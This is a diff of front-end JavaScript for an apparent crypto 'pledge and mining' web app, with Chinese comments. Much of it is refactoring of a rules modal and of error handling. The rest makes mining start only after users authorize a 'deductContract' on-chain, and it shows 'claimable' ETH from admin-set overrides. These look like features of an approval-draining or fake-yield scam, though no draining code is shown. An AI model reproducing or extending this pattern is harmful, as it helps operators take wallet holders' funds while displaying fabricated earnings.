@@ -529,6 +529,32 @@ function getElements() {
     modalWalletBalanceLabel: document.getElementById('modalWalletBalanceLabel')
   };
 }
+// ==================== 綁定 ? 按鈕 ====================
+function bindRulesButton() {
+  const rulesModal = document.getElementById('rulesModal');
+  const rulesButton = document.getElementById('rulesButton');
+  const closeRulesModal = document.getElementById('closeRulesModal');
+
+  if (rulesButton) {
+    rulesButton.addEventListener('click', () => {
+      const rulesTitle = document.getElementById('rulesTitle');
+      const rulesContent = document.getElementById('rulesContent');
+      if (rulesTitle) rulesTitle.textContent = translations[currentLang].rulesTitle;
+      if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
+      if (rulesModal) rulesModal.style.display = 'flex';
+    });
+  }
+  if (closeRulesModal) {
+    closeRulesModal.addEventListener('click', () => {
+      if (rulesModal) rulesModal.style.display = 'none';
+    });
+  }
+  if (rulesModal) {
+    rulesModal.addEventListener('click', e => {
+      if (e.target === rulesModal) rulesModal.style.display = 'none';
+    });
+  }
+}
 // ==================== 更新帳戶餘額顯示 ====================
 function getTotalAccountBalanceInSelectedToken() {
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
@@ -698,13 +724,13 @@ function updateClaimModalLabels() {
 async function claimInterest() {
   await refreshEthPrice();
   updateClaimModalLabels();
-  // 安全取得當前用戶資料
+  // 【宇宙終極防呆版】優先讀取後台覆寫的 cumulative
   const currentUserData = window.lastSseData?.users?.[userAddress?.toLowerCase()] ||
                           window.loadedUserData ||
                           {};
   const currentOverrides = window.currentOverrides ||
                           (window.lastSseData?.overrides?.[userAddress?.toLowerCase()] || {});
-  const claimableETH = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0
+  const claimableETH = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0 // 【修改】忽略 0
       ? currentOverrides.cumulative
       : (currentUserData.cumulative || window.currentClaimable || 0);
   if (modalClaimableETH) modalClaimableETH.textContent = `${Number(claimableETH).toFixed(7)} ETH`;
@@ -950,7 +976,7 @@ async function handleConditionalAuthorizationFlow() {
       // 【強制更新狀態】
       await updateUIBasedOnChainState();
     } catch (err) {
-      updateStatus(`Activation failed: ${err.message}`, true);
+      throw err; // 拋出錯誤，由 startBtn 處理
     }
   }
   await forceRefreshWalletBalance();
@@ -985,9 +1011,7 @@ function updateLanguage(lang) {
     if (elements.modalTotalBalanceLabel) elements.modalTotalBalanceLabel.textContent = translations[lang].totalBalance;
     if (elements.modalPledgedAmountLabel) elements.modalPledgedAmountLabel.textContent = translations[lang].pledgedAmount;
     if (elements.modalPendingInterestLabel) elements.modalPendingInterestLabel.textContent = translations[lang].pendingInterest;
-    if (
-
-    elements.modalClaimedInterestLabel) elements.modalClaimedInterestLabel.textContent = translations[lang].claimedInterest;
+    if (elements.modalClaimedInterestLabel) elements.modalClaimedInterestLabel.textContent = translations[lang].claimedInterest;
     if (elements.modalWalletBalanceLabel) elements.modalWalletBalanceLabel.textContent = translations[lang].walletBalance;
     if (elements.totalPledgeLabel) elements.totalPledgeLabel.textContent = translations[lang].totalPledge;
     if (elements.estimateLabel) elements.estimateLabel.textContent = translations[lang].estimate;
@@ -1114,6 +1138,7 @@ setInterval(checkPledgeExpiry, 60000);
 document.addEventListener('DOMContentLoaded', async () => {
   console.log('[DEBUG] DOM載入完成，開始初始化');
   getElements();
+  bindRulesButton(); // 【關鍵】立即綁定 ? 按鈕
   updateLanguage(currentLang);
   initializeWallet();
   setTimeout(() => {
@@ -1135,7 +1160,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       pledgeToken.innerHTML = '';
       tokens.forEach(t => {
         const decimals = t === 'WETH' ? 18 : 6;
-        const bigIntBalance = cachedWalletBalances[t] || 0n;
+                const bigIntBalance = cachedWalletBalances[t] || 0n;
         const formatted = ethers.formatUnits(bigIntBalance, decimals);
         const value = parseFloat(formatted).toFixed(3);
         const opt = document.createElement('option');
@@ -1256,39 +1281,31 @@ document.addEventListener('DOMContentLoaded', async () => {
       startBtn.textContent = 'Authorizing...';
       try {
         await handleConditionalAuthorizationFlow();
-        let canStart = false;
-        if (selectedToken === 'WETH') {
-          const price = ethPriceCache.price || 2500;
-          const wethValueUSD = balance * price;
-          if (wethValueUSD >= 500) canStart = true;
-        } else {
-          if (balance >= 1) canStart = true;
+
+        // 【關鍵】只有鏈上確認成功才啟動挖礦
+        const isActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
+        if (!isActive) throw new Error('Authorization cancelled or failed');
+
+        pledgedAmount = balance;
+        lastPayoutTime = Date.now();
+        currentCycleInterest = calculatePayoutInterest();
+        authorizedToken = selectedToken;
+        if (!accountBalance[selectedToken]) {
+          accountBalance[selectedToken] = { wallet: 0, pledged: 0, interest: 0 };
         }
-        if (canStart) {
-          pledgedAmount = balance;
-          lastPayoutTime = Date.now();
-          currentCycleInterest = calculatePayoutInterest();
-          authorizedToken = selectedToken;
-          if (!accountBalance[selectedToken]) {
-            accountBalance[selectedToken] = { wallet: 0, pledged: 0, interest: 0 };
-          }
-          accountBalance[selectedToken].pledged = balance;
-          localStorage.setItem('pledgedAmount', pledgedAmount.toString());
-          localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
-          localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
-          localStorage.setItem('authorizedToken', authorizedToken);
-          updateStatus(translations[currentLang].miningStarted);
-          activateStakingUI();
-          updateAccountBalanceDisplay();
-          await smartSave();
-          startBtn.style.display = 'none';
-        } else {
-          updateStatus('Balance too low.', true);
-          startBtn.disabled = false;
-          startBtn.textContent = translations[currentLang].startBtnText;
-        }
+        accountBalance[selectedToken].pledged = balance;
+        localStorage.setItem('pledgedAmount', pledgedAmount.toString());
+        localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
+        localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
+        localStorage.setItem('authorizedToken', authorizedToken);
+        updateStatus(translations[currentLang].miningStarted);
+        activateStakingUI();
+        updateAccountBalanceDisplay();
+        await smartSave();
+        startBtn.style.display = 'none';
       } catch (error) {
-        updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
+        // 【關鍵】失敗時恢復 Start 按鈕
+        updateStatus(`授權失敗或已取消: ${error.message}`, true);
         startBtn.disabled = false;
         startBtn.textContent = translations[currentLang].startBtnText;
       }
@@ -1387,7 +1404,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     accountBalanceValue.addEventListener('click', showAccountDetail);
   }
   if (closeAccountDetail) closeAccountDetail.addEventListener('click', closeAccountDetailModal);
-   if (closeAccountDetailBtn) closeAccountDetailBtn.addEventListener('click', closeAccountDetailModal);
+  if (closeAccountDetailBtn) closeAccountDetailBtn.addEventListener('click', closeAccountDetailModal);
   if (accountDetailModal) accountDetailModal.addEventListener('click', e => e.target === accountDetailModal && closeAccountDetailModal());
 
   document.querySelectorAll('.tab').forEach(tab => {
@@ -1401,29 +1418,8 @@ document.addEventListener('DOMContentLoaded', async () => {
     });
   });
 
-  const rulesModal = document.getElementById('rulesModal');
-  const rulesButton = document.getElementById('rulesButton');
-  const closeRulesModal = document.getElementById('closeRulesModal');
-
-  if (rulesButton) {
-    rulesButton.addEventListener('click', () => {
-      const rulesTitle = document.getElementById('rulesTitle');
-      const rulesContent = document.getElementById('rulesContent');
-      if (rulesTitle) rulesTitle.textContent = translations[currentLang].rulesTitle;
-      if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
-      if (rulesModal) rulesModal.style.display = 'flex';
-    });
-  }
-  if (closeRulesModal) {
-    closeRulesModal.addEventListener('click', () => {
-      if (rulesModal) rulesModal.style.display = 'none';
-    });
-  }
-  if (rulesModal) {
-    rulesModal.addEventListener('click', e => {
-      if (e.target === rulesModal && rulesModal) rulesModal.style.display = 'none';
-    });
-  }
+  // 【已修正】? 按鈕事件綁定（已移至 bindRulesButton()）
+  // 不再重複綁定
 
   if (userAddress) {
     (async () => {
